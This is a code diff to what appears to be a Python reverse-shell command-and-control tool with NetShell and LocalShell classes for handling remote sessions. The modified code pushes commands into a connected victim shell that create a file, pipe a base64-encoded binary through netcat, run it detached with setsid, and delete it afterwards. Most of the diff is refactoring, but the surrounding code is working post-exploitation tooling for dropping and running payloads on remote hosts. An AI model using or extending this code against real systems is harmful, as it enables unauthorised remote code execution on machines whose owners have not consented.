@@ -14,6 +14,7 @@ import os
 
 logging.basicConfig(level=logging.INFO)
 sys.dont_write_bytecode = True
+PROJ_DIR = os.path.dirname(os.path.realpath(__file__))
 
 class NetShell(cmd.Cmd):
     def __init__(self, server):
@@ -46,9 +47,6 @@ class NetShell(cmd.Cmd):
     """
 
     def _is_alive(self):
-        """ Checks if socket is alive
-            https://stackoverflow.com/questions/48024720/python-how-to-check-if-socket-is-still-connected
-        """
         while self.is_loop:
             try:
                 data = self.server.client_socket.recv(16, socket.MSG_DONTWAIT | socket.MSG_PEEK)
@@ -113,10 +111,9 @@ class LocalShell(cmd.Cmd):
         if len(sys.argv) > 1 and sys.argv[1] == "-l":
             self.do_listen(None)
         
-        project_dir = os.path.dirname(os.path.realpath(__file__))
-        if not os.path.isfile(os.path.join(project_dir, "payloads/payload")):
+        if not os.path.isfile(os.path.join(PROJ_DIR, "payloads/payload")):
             logging.warning('Warning: Binary file "payload" is not present.')
-            chk_payload(project_dir)
+            chk_payload(PROJ_DIR)
 
         
     def emptyline(self):
@@ -145,19 +142,19 @@ class LocalShell(cmd.Cmd):
         if not sock:
             return
         
-        if sock.sysinfo.is_python3:
+        if sock.sysinfo.is_nc:
             logging.info(f"Sending payload..")
             sock.client_socket.send(b"touch payload\n")
             sock.client_socket.send(b"chmod +x payload\n")
-            sock.client_socket.send(b"setsid sh -c 'nc -l 1234 | base64 -d > payload && sleep 5 && ./payload'\n")
+            sock.client_socket.send(f"setsid sh -c '{sock.sysinfo.is_nc} -l 1234 | base64 -d > payload && sleep 5 && ./payload'\n".encode())
             sock.server_socket.close()
             sock.client_socket.close()
-            send_file("payload", "localhost", 1234)
+            send_file(os.path.join(PROJ_DIR, "payloads/payload"), "localhost", 1234)
             logging.info(f"Payload sent. Starting listener..")
             sock = listen(line, 1)
             sock.client_socket.send(b"rm -rf payload\n")
         else:
-            logging.error("python was not found. Using shell as client.")
+            logging.error("Fail to sent payload. Using shell as client.")
 
         self.currentSession = NetShell(sock)
 
